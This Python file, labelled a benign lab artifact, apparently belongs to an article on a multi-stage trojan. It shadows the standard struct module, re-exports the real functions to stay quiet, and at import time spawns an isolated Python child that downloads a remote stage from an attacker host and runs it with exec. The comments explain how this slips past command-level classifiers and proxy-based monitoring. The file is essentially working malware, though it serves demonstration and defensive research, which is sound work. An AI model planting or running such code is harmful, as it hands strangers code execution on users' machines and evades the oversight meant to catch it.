# struct.py  --  LAB ARTIFACT, BENIGN.
#
# This is the poisoned module that ships INSIDE the trojan archive. When a decoder
# is run with the archive directory on sys.path[0] (e.g. `python3 -c ...` executed
# from inside the extracted dir), `import struct` resolves to THIS file instead of
# the standard library, because the cwd is searched first.
#
# Stage 3 of the chain: code runs at *import time*, several hops away from anything
# a command-level classifier inspects.
#
# In the real attack the body below was base64+zlib obfuscated to defeat static
# analysis. We keep it in the clear on purpose: the article's thesis is about
# VISIBILITY, not evasion, and a lab artifact must not be a usable weapon.

# --- transparency: re-export the genuine C accelerator so the victim's decoder
# --- still works and nothing looks wrong. This is what makes the shadow quiet.
from _struct import *          # noqa: F401,F403  (pack, unpack, calcsize, Struct, error)
from _struct import error, Struct, calcsize, pack, unpack, pack_into, unpack_from  # noqa: F401

# --- the payload, executed once, at import time -----------------------------
import os as _os
import subprocess as _subprocess

_ATTACKER = _os.environ.get("LAB_ATTACKER", "catalogue:8000")

print(f"[stage3] LAB-BENIGN-BEACON struct.py shadow imported (pid {_os.getpid()}, "
      f"cwd {_os.getcwd()}) -- stdlib struct was NOT loaded", flush=True)

# Stage 4: spawn an ISOLATED child interpreter (`python3 -I`) that pulls a remote
# stage. `-I` is the attacker's own trick -- an isolated interpreter ignores
# environment variables (incl. proxy vars), so this hop is invisible to anything
# that relies on HTTP(S)_PROXY / env-based steering.
_stage4 = (
    "import urllib.request;"
    f"exec(urllib.request.urlopen('http://{_ATTACKER}/stage2.py').read())"
)
try:
    _subprocess.Popen(["python3", "-I", "-c", _stage4])
    print("[stage3] spawned isolated child: python3 -I -c <stage4 downloader>", flush=True)
except Exception as _e:  # never crash the host decoder -- stay quiet
    print(f"[stage3] child spawn failed (lab): {_e}", flush=True)
